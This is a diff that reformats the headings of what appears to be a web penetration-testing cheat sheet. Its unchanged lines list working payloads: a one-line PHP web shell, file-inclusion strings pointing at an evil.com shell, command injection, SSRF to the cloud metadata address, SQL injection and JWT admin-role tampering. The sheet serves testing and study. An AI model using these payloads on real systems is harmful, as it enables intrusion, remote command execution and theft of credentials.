@@ -144,7 +144,7 @@ log tampering
     <input type="submit">
   </form>
 
-File Upload
+### File Upload
 
 Endpoint: /api/v1/upload
 
@@ -154,7 +154,7 @@ shell.php → <?php system($_GET['cmd']); ?>
 
 test.jpg with polyglot payload
 
-🔹 LFI / RFI (File Inclusion)
+### 🔹 LFI / RFI (File Inclusion)
 
 Endpoint: /download?file=report.pdf
 
@@ -166,7 +166,7 @@ php://filter/convert.base64-encode/resource=index.php
 
 http://evil.com/shell.txt
 
-🔹 Command Injection
+### 🔹 Command Injection
 
 Endpoint: /ping?ip=127.0.0.1
 
@@ -176,7 +176,7 @@ Payloads:
 
 127.0.0.1 && id
 
-🔹 SSRF (Server-Side Request Forgery)
+### 🔹 SSRF (Server-Side Request Forgery)
 
 Endpoint: /fetch?url=http://target.com/page
 
@@ -188,7 +188,7 @@ http://169.254.169.254/latest/meta-data/
 
 http://burp-collaborator-server.com/
 
-4. Post-Exploitation
+### 4. Post-Exploitation
 
  Password reuse تست شود
 
@@ -198,7 +198,7 @@ Decode JWT → modify role: admin
 
  Log tampering / privilege escalation
 
-5. Tools Integration
+### 5. Tools Integration
 
 Burp Suite Extensions:
 
@@ -212,7 +212,7 @@ Turbo Intruder → brute force سنگین
 
 Collaborator → تست SSRF/XSS Blind
 
-🎯 Quick Reference Payloads
+### 🎯 Quick Reference Payloads
 
 SQLi: ' OR '1'='1 --
 
